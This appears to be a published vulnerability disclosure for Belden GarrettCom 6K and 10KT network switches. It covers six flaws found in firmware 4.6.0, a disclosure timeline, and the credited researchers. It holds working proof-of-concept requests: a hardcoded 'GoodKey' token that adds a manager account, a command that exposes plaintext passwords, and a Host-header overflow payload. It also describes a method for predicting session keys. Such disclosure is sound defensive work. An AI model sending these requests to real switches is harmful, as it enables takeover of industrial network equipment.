@@ -1,0 +1,235 @@
+Introduction
+------------
+
+Vulnerabilities were identified in the Belden GarrettCom 6K and 10KT
+(Magnum) series network switches. These were discovered during a black box 
+assessment and therefore the vulnerability list should not be considered 
+exhaustive; observations suggest that it is likely that further vulnerabilities 
+exist. It is strongly recommended that GarrettCom undertake a full whitebox
+security assessment of these switches.
+
+The version under test was indicated as: 4.6.0.  Belden Garrettcom released
+an advisory on 8 May 2017, indicating that issues were fixed in 4.7.7:
+http://www.belden.com/docs/upload/Belden-GarrettCom-MNS-6K-10K-Security-Bulletin-BSECV-2017-8.pdf
+
+GarrettCom-01 - Authentication Bypass: Hardcoded Web Interface Session Token
+----------------------------------------------------------------------------
+
+Severity: **High**
+
+The string "GoodKey" can be used in place of a session token for the web
+interface, allowing a complete bypass to all web interface authentication.
+The following request/response demonstrates adding a user ‘gibson’ with the
+password ‘god’ on any GarrettCom 6K or 10K switch.
+
+    GET /gc/service.php?a=addUser&uid=gibson&pass=god&type=manager&key=GoodKey
+HTTP/1.1
+    Host: 192.168.0.2
+    Connection: close
+    User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML,
+like Gecko) Chrome/56.0.2924.28 Safari/537.36
+    Accept: */*
+    Referer: https://192.168.0.2/gc/flash.php
+    Accept-Encoding: gzip, deflate, sdch, br
+    Accept-Language: en-US,en;q=0.8
+
+
+    HTTP/1.0 200 OK
+    Server: GoAhead-Webs
+    Content-Type: text/html
+
+    <?xml version='1.0' encoding='UTF-8'?><data val="users"><changed
+val="yes" />
+    <helpfile val="user_accounts.html" />
+    <user uid="operator" access="Operator" />
+    <user uid="manager" access="Manager" />
+    <user uid="gibson" access="Manager" />
+    </data>
+
+GarrettCom-02 - Secrets Accessible to All Users
+-----------------------------------------------
+
+Severity: **High**
+
+Unprivileged but authenticated users ("operator" level access) can view the
+plaintext passwords of all users configured on the system, allowing them to
+escalate privileges to "manager" level.  While the default "show config"
+masks the passwords, executing "show config saved" includes the plaintext
+passwords. The value of the "secrets" setting does not affect this.
+
+    6K>show config group=user saved
+    ...
+    #User Management#
+    user
+    add user=gibson level=2 pass=god
+    Exit
+    ...
+
+GarrettCom-03 - Stack Based Buffer Overflow in HTTP Server
+----------------------------------------------------------
+
+Severity: **High**
+
+When rendering the /gc/flash.php page, the server performs URI encoding of
+the Host header into a fixed-length buffer on the stack.  This decoding appears
+unbounded and can lead to memory corruption, possibly including remote code
+execution.  Sending garbage data appears to hang the webserver thread after
+responding to the present request.  Requests with Host headers longer than
+220 characters trigger the observed behavior.
+
+    GET /gc/flash.php HTTP/1.1
+    Host: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+    Connection: close
+    Cache-Control: max-age=0
+    Upgrade-Insecure-Requests: 1
+    User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML,
+like Gecko) Chrome/56.0.2924.28 Safari/537.36
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,
+image/webp,*/*;q=0.8
+    Accept-Encoding: gzip, deflate, sdch, br
+    Accept-Language: en-US,en;q=0.8
+
+GarrettCom-04 - SSL Keys Shared Across Devices
+----------------------------------------------
+
+Severity: **Moderate**
+
+The SSL certificate on all devices running firmware version 4.6.0 is the
+same.  This issue was previously reported and an advisory released by
+ICS-CERT.  While GarrettCom reported the issue was fixed in 4.5.6, the web
+server certificate remains static in 4.6.0:
+
+    openssl s_client -connect 192.168.0.5:443 -showcerts
+    CONNECTED(00000003)
+    depth=0 C = US, ST = California, L = Fremont, O = Belden, OU =
+Technical Support, CN = 192.168.1.2, emailAddress = gcisupport@belden.com
+    verify error:num=18:self signed certificate
+    verify return:1
+    depth=0 C = US, ST = California, L = Fremont, O = Belden, OU =
+Technical Support, CN = 192.168.1.2, emailAddress = gcisupport@belden.com
+    verify return:1
+    ---
+    Certificate chain
+    0 s:/C=US/ST=California/L=Fremont/O=Belden/OU=Technical Support/CN=
+192.168.1.2/emailAddress=gcisupport@belden.com
+    i:/C=US/ST=California/L=Fremont/O=Belden/OU=Technical Support/CN=
+192.168.1.2/emailAddress=gcisupport@belden.com
+    -----BEGIN CERTIFICATE-----
+    MIIEtTCCA52gAwIBAgIBADANBgkqhkiG9w0BAQUFADCBnTELMAkGA1UEBhMCVVMx
+    EzARBgNVBAgTCkNhbGlmb3JuaWExEDAOBgNVBAcTB0ZyZW1vbnQxDzANBgNVBAoT
+    BkJlbGRlbjEaMBgGA1UECxMRVGVjaG5pY2FsIFN1cHBvcnQxFDASBgNVBAMTCzE5
+    Mi4xNjguMS4yMSQwIgYJKoZIhvcNAQkBFhVnY2lzdXBwb3J0QGJlbGRlbi5jb20w
+    HhcNMTUxMDI3MTEyNzQ2WhcNMjUxMDI0MTEyNzQ2WjCBnTELMAkGA1UEBhMCVVMx
+    EzARBgNVBAgTCkNhbGlmb3JuaWExEDAOBgNVBAcTB0ZyZW1vbnQxDzANBgNVBAoT
+    BkJlbGRlbjEaMBgGA1UECxMRVGVjaG5pY2FsIFN1cHBvcnQxFDASBgNVBAMTCzE5
+    Mi4xNjguMS4yMSQwIgYJKoZIhvcNAQkBFhVnY2lzdXBwb3J0QGJlbGRlbi5jb20w
+    ggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQDFlt+j4OvpcgfdrFGnBxti
+    ds6r9sNEcR9JdAFbOmwybQkdqIw9Z9+teU/rixPocEE4gL8beNuw/D3lDc4RJ63m
+    1zuQ1riFOkTsz7koKQNWTh3CkIBE7843p5I/GVvhfR7xNCCmCWPdq+6/b3nhott5
+    oBeMLOjIWnjFgyVMsWR22JOYv+euWwr4oqZDLfBHjfipnu36J1E2kHLG3TL9uwyN
+    DUxtrIbvfi5tOxi8tx1bxZFQU1jxoQa725gO+1TOYzfSoY1a7/M0rMhJM1wFXak6
+    jbDbJLSv2TXMWrSJlGFUbCcKv3kE22zLcU/wx1Xl4a4NNvFW7Sf5OG2B+bFLr4fD
+    AgMBAAGjgf0wgfowHQYDVR0OBBYEFLtGmDWgd773vSkKikDFSz8VOZ7DMIHKBgNV
+    HSMEgcIwgb+AFLtGmDWgd773vSkKikDFSz8VOZ7DoYGjpIGgMIGdMQswCQYDVQQG
+    EwJVUzETMBEGA1UECBMKQ2FsaWZvcm5pYTEQMA4GA1UEBxMHRnJlbW9udDEPMA0G
+    A1UEChMGQmVsZGVuMRowGAYDVQQLExFUZWNobmljYWwgU3VwcG9ydDEUMBIGA1UE
+    AxMLMTkyLjE2OC4xLjIxJDAiBgkqhkiG9w0BCQEWFWdjaXN1cHBvcnRAYmVsZGVu
+    LmNvbYIBADAMBgNVHRMEBTADAQH/MA0GCSqGSIb3DQEBBQUAA4IBAQBAiuv06CMD
+    ij+9bEZAfmHftptG4UqsNgYIFZ1sN7HC6RBR9xy45fWVcQN3l3KiyddLsftbZSOa
+    CRPpzqgpF58hGwAa7+yQPOjOWf+uLc9Oyex6P9ewAo6c5iiYI865FSQ+QCY4xbD1
+    Uk/WFV2LKOzxkXPRcVB4KR81g8tSZF3E8llybhEngg7cvN3uHpO5a5U085xuBbcF
+    To9PSbGKyJ7UGESBTD6KxLWAxoD6VGRV2CAZa/F9RTbdG1ZbTUMvoEDmYqv7Pjv/
+    ApZzztLJlCyhVM4N/jh/Q/g1VaQWuzPpza6utjN5soUxeZYJB6KwzGUiLnyTNBJz
+    L4JtsUO8AcWb
+    -----END CERTIFICATE-----
+
+Note that Belden Garrettcom has addressed this issue by reinforcing that
+users of the switches should install their own SSL certificates if they
+do not want to use the default certificate and key.
+
+GarrettCom-05 - Weak SSL Ciphers Enabled
+----------------------------------------
+
+Severity: **Moderate**
+
+Many of the SSL ciphers available for the switch are outdated or use
+insecure ciphers or hashes.  Additionally, no key exchanges with perfect forward
+secrecy are offered, rendering all previous communications possibly compromised,
+given the issue reported above.  Particularly of note is the use of 56-bit DES,
+RC4, and MD5-based MACs.
+
+    ssl3: AES256-SHA
+    ssl3: CAMELLIA256-SHA
+    ssl3: DES-CBC3-SHA
+    ssl3: AES128-SHA
+    ssl3: SEED-SHA
+    ssl3: CAMELLIA128-SHA
+    ssl3: RC4-SHA
+    ssl3: RC4-MD5
+    ssl3: DES-CBC-SHA
+    tls1: AES256-SHA
+    tls1: CAMELLIA256-SHA
+    tls1: DES-CBC3-SHA
+    tls1: AES128-SHA
+    tls1: SEED-SHA
+    tls1: CAMELLIA128-SHA
+    tls1: RC4-SHA
+    tls1: RC4-MD5
+    tls1: DES-CBC-SHA
+    tls1_1: AES256-SHA
+    tls1_1: CAMELLIA256-SHA
+    tls1_1: DES-CBC3-SHA
+    tls1_1: AES128-SHA
+    tls1_1: SEED-SHA
+    tls1_1: CAMELLIA128-SHA
+    tls1_1: RC4-SHA
+    tls1_1: RC4-MD5
+    tls1_1: DES-CBC-SHA
+    tls1_2: AES256-GCM-SHA384
+    tls1_2: AES256-SHA256
+    tls1_2: AES256-SHA
+    tls1_2: CAMELLIA256-SHA
+    tls1_2: DES-CBC3-SHA
+    tls1_2: AES128-GCM-SHA256
+    tls1_2: AES128-SHA256
+    tls1_2: AES128-SHA
+    tls1_2: SEED-SHA
+    tls1_2: CAMELLIA128-SHA
+    tls1_2: RC4-SHA
+    tls1_2: RC4-MD5
+    tls1_2: DES-CBC-SHA
+
+GarrettCom-06 - Weak HTTP session key generation
+------------------------------------------------
+
+Severity: **Moderate**
+
+The HTTP session key generation is predictable due to the lack of
+randomness in the generation process. The key is generated by hashing the 
+previous hash result with the current time unit with precision around 50 unit 
+per second. The previous hash is replaced with a fixed salt for the first hash 
+generation.
+
+The vulnerability allows an attacker to predict the first key that’s
+generated by the switch if he has some knowledge about when the key was generated.
+Alternatively, the vulnerability also enables privilege escalation attacks
+which predict all future keys by observing two consecutive key generations of
+lower privileges.
+
+Timeline
+--------
+
+2017/01/?? - Issues Discovered
+2017/01/27 - Reported to BEL-SM-PSIRT@belden.com
+2017/04/27 - 90 day timeline expires, Belden reports patched release forthcoming.
+2017/05/08 - Belden releases update & advisory.
+2017/05/15 - Disclosure published
+
+Discovery
+---------
+
+These issues were discovered by Andrew Griffiths, David Tomaschik, and
+Xiaoran Wang of the Google Security Assessments Team.
